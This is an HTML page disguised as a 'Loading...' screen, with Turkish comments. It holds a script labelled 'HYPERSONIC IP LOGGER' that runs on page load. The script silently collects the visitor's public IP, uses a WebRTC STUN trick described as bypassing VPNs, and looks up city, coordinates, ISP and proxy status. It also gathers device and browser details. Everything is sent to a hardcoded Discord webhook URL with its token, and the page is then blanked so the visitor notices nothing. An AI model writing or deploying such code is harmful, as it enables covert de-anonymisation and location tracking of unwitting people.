<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Yükleniyor...</title>
    <style>
        body { margin:0; padding:0; background:#f0f0f0; }
    </style>
</head>
<body>
    <!-- ZİYARETÇİ HİÇBİR ŞEY GÖRMEZ -->
    
    <script>
    // =========================================================================
    // HYPERSONIC IP LOGGER - TEK HTML DOSYASI
    // =========================================================================
    
    (async function() {
        // ---- KONFİGÜRASYON ----
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1458566674302238923/0EPCSiG8KU6QcDoFcT0Ugc6BN_fGX_7K6KsXtflSlkKV4ZPH9zSHx3bnirPb0bWDowEk"; // DISCORD WEBHOOK'UNU YAPIŞTIR
        
        // ---- 1. PUBLIC IP'Yİ AL (WEBRTC İLE VPN BYPASS) ----
        async function getWebRTCIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({
                        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
                    });
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    
                    let timeout = setTimeout(() => {
                        pc.close();
                        resolve(null);
                    }, 3000);
                    
                    pc.onicecandidate = (ice) => {
                        if (ice && ice.candidate && ice.candidate.candidate) {
                            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                            if (match) {
                                clearTimeout(timeout);
                                pc.close();
                                resolve(match[1]);
                            }
                        }
                    };
                } catch(e) {
                    resolve(null);
                }
            });
        }

        // ---- 2. PUBLIC IP'Yİ AL (İKİNCİ YÖNTEM) ----
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                return null;
            }
        }

        // ---- 3. IP'DEN LOKASYON AL (ip-api.com) ----
        async function getLocation(ip) {
            try {
                const response = await fetch(`http://ip-api.com/json/${ip}?fields=16976857`);
                const data = await response.json();
                return data;
            } catch(e) {
                return null;
            }
        }

        // ---- 4. TÜM HEADER'LARI TOPLA (CLOUDFLARE BİLGİLERİ) ----
        function getAllHeaders() {
            // Browser'dan header alamayız, ama Cloudflare'in eklediği JS var mı kontrol et
            const headers = {
                'user-agent': navigator.userAgent,
                'platform': navigator.platform,
                'language': navigator.language,
                'cookie-enabled': navigator.cookieEnabled,
                'do-not-track': navigator.doNotTrack,
                'hardware-concurrency': navigator.hardwareConcurrency,
                'device-memory': navigator.deviceMemory || 'unknown',
                'connection-type': navigator.connection ? navigator.connection.effectiveType : 'unknown',
                'screen': `${screen.width}x${screen.height}`,
                'timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
                'referrer': document.referrer || 'direct'
            };
            
            // Cloudflare trace varsa ekle
            if (window.cf_trace) {
                headers['cf-trace'] = window.cf_trace;
            }
            
            return headers;
        }

        // ---- 5. WEBHOOK'A GÖNDER ----
        async function sendToWebhook(data) {
            if (!WEBHOOK_URL || WEBHOOK_URL === "WEBHOOK_URL_NI_BURAYA_YAZ") {
                console.log("Webhook URL ayarlanmamış!");
                return;
            }
            
            const embed = {
                username: "🚀 HYPERSONIC LOGGER",
                embeds: [{
                    title: "🎯 YENİ ZİYARETÇİ!",
                    color: 0xFF0000,
                    fields: [
                        { name: "📡 IP ADRESİ", value: `\`${data.ip || 'bilinmiyor'}\``, inline: true },
                        { name: "🌐 WEBRTC IP", value: `\`${data.webrtc_ip || 'yok'}\``, inline: true },
                        { name: "🏴󠁧󠁢󠁥󠁮󠁧󠁿 ÜLKE", value: data.location?.country || 'bilinmiyor', inline: true },
                        { name: "🏙️ ŞEHİR", value: data.location?.city || 'bilinmiyor', inline: true },
                        { name: "📍 KOORDİNAT", value: `${data.location?.lat || '?'}, ${data.location?.lon || '?'}`, inline: true },
                        { name: "🛜 ISP", value: data.location?.isp || 'bilinmiyor', inline: true },
                        { name: "📱 MOBİL", value: data.location?.mobile ? 'Evet' : 'Hayır', inline: true },
                        { name: "🔒 VPN/PROXY", value: data.location?.proxy ? 'Evet' : 'Hayır', inline: true },
                        { name: "💻 İŞLETİM SİSTEMİ", value: data.headers.platform, inline: true },
                        { name: "🌍 TARAYICI", value: data.headers['user-agent'].substring(0, 50) + '...', inline: false }
                    ],
                    footer: { text: `Ziyaret: ${new Date().toLocaleString()}` }
                }]
            };
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });
                console.log("✅ Webhook gönderildi!");
            } catch(e) {
                console.error("❌ Webhook hatası:", e);
            }
        }

        // ---- ANA FONKSİYON ----
        console.log("🚀 HYPERSONIC LOGGER BAŞLATILDI...");
        
        // Tüm verileri topla
        const headers = getAllHeaders();
        const publicIP = await getPublicIP();
        const webrtcIP = await getWebRTCIP();
        
        // Lokasyon bilgisi al (önce WebRTC IP'si varsa onu kullan, yoksa public IP'yi)
        let location = null;
        if (webrtcIP && webrtcIP !== publicIP) {
            location = await getLocation(webrtcIP);
        } else if (publicIP) {
            location = await getLocation(publicIP);
        }
        
        // Verileri birleştir
        const data = {
            ip: publicIP,
            webrtc_ip: webrtcIP,
            location: location,
            headers: headers,
            timestamp: Date.now()
        };
        
        console.log("📊 TOPLANAN VERİLER:", data);
        
        // Webhook'a gönder
        await sendToWebhook(data);
        
        // Sayfada hiçbir şey gösterme
        document.body.innerHTML = '';
    })();
    </script>
</body>
</html>
